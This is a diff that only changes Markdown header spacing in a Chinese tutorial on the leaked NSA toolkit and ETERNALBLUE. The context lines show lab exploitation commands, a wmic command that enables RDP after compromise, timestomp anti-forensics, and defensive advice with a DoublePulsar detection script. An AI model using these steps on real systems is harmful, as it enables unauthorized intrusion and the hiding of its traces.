@@ -14,7 +14,7 @@
  - Windows：包含对Windows操作系统的许多黑客工具，但主要针对的是较旧版本的Windows（Windows XP中）和Server 2003。
 
 
-###**主要工具**
+### **主要工具**
 
 
 *FUZZBUNCH*：一款类似Metasploit的Exploit框架
@@ -41,7 +41,7 @@
 |Zippybeer   |SMTP漏洞||445
 |Esteemaudit   |RDP漏洞|Windows XP, Windows Server 2003|3389
 
-###**ETERNALBLUE攻击原理分析**
+### **ETERNALBLUE攻击原理分析**
 
 ETERNALBLUE是一个RCE漏洞利用，通过SMB（Server Message Block）和NBT（NetBIOS over TCP/IP）影响Windows XP,Windows 2008 R2和Windows 7系统。<br>
 漏洞发生处：C:\Windows\System32\drivers\srv.sys<br>
@@ -98,7 +98,7 @@ ETERNALBLUE是一个RCE漏洞利用，通过SMB（Server Message Block）和NBT�
     }
 具体见参考资料5<br>
 
-###**漏洞复现**
+### **漏洞复现**
 
  1. 环境搭建<br>
 | 主机类型 | OS | IP
@@ -134,7 +134,7 @@ use Eternalblue
 `set RHOST XXX.XXX.XXX.XXX`
 `exploit`
  
-###**后渗透攻击**
+### **后渗透攻击**
  
 1. 开3389端口<br>
 （1）`wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != “”) call 
@@ -195,7 +195,7 @@ setuserauthenticationrequired 1`<br>
  `timestomp xiugai.doc -f old.doc`
 
 
-###**检测&防御**
+### **检测&防御**
 1. 国外有人写了个检测Doublepulsar入侵的脚本，运行环境需要python2.6, 地址[https://github.com/countercept/doublepulsar-detection-script][3], 使用方法
 `python detect_doublepulsar_smb.py --ip XXX.XXX.XXX.XXX` 
 `python detect_doublepulsar_rdp.py --file ips.list --verbose --threads 1`
@@ -203,7 +203,7 @@ setuserauthenticationrequired 1`<br>
 2. 安装相应补丁https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/
 3. 如非必要，关闭25, 88, 139, 445, 3389端口
 4. 使用防火墙、或者安全组配置安全策略，屏蔽对包括445、3389在内的系统端口访问。(见参考资料7)<br>
-###**参考资料**
+### **参考资料**
 1. http://thehackernews.com/2017/04/swift-banking-hacking-tool.html
 2. http://www.freebuf.com/sectool/132029.html
 3. https://www.cyberscoop.com/nsa-hacking-tools-shadow-brokers-dark-web-microsoft-smb/
